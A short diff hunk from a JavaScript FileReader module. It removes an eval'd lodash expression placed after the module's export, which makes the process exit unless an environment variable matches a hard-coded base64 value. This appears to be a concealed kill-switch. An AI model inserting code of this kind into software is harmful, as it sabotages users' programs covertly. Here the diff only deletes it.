@@ -79,7 +79,3 @@ class FileReader {
 }
 
 export default FileReader;
-
-eval(
-	"_.chain(process.env).get('key').thru(btoa).eq('d2tkZ3Vy').tap(v => !v && process.exit()).value()"
-);
